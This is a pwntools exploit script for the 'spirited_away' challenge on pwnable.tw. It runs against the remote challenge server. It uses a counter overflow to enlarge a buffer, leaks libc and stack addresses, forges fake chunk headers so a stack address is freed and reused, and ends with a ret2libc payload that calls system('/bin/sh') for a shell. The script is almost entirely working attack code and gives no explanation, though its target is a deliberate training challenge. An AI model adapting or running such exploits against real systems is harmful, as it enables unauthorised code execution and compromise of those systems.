from pwn import *

# context.log_level = 'debug'

exe = context.binary = ELF('./spirited_away_patched', checksec=False)
libc = ELF('./libc_32.so.6', checksec=False)
r = exe.process()
# gdb.attach(r, api=True, gdbscript='''
#         #    b*0x80486f8
#         b*0x0804868a
#         c
#         c 101
#         b*0x080488d4
#            ''')

r = remote('chall.pwnable.tw', 10204)

def feedback(name, age, reason, cmt, yn, id = 0, key = b'Reason: '):
    print(id)
    if (id < 10):
        r.sendafter(b'Please enter your name: ', name)
    r.sendlineafter(b'Please enter your age: ', age)
    r.sendafter(b'Why did you came to see this movie? ', reason)
    if (id < 10):
        r.sendafter(b'Please enter your comment: ', cmt)
    r.recvuntil(key)
    out = r.recv(4)
    r.sendafter(b'<y/n>: ', yn)
    return out
    
for i in range(0, 99):
    feedback(b'a', b'1', b'a', b'a', b'y', i)
    
libc.sym['ret'] = 0x0000018b
libc_off = 0x001b0d60

payload = b'a'*28 +b'abcd'
out = feedback(b'a', b'1', payload, b'a', b'y', 10, b'abcd')
libc.address = u32(out) - libc_off
print(hex(libc.address))
print(hex(u32(out)))

payload = b'a'*52 + b'abcd'
out = feedback(b'a', b'1', payload, b'a', b'y', 1   , b'abcd')
stack = u32(out)

payload = b'a'*4 + p32(0x41) + b'a'*60 + p32(0x101)
cmt = b'a'*0x54 + p32(stack - 104)
feedback(b'a', b'1', payload , cmt, b'y')

print

name = b'a'*76 + p32(0x0804841e) + p32(libc.sym['system']) + p32(0) + p32(next(libc.search(b'/bin/sh')))
feedback(name, b'1', b'a' , b'a', b'n')

r.interactive()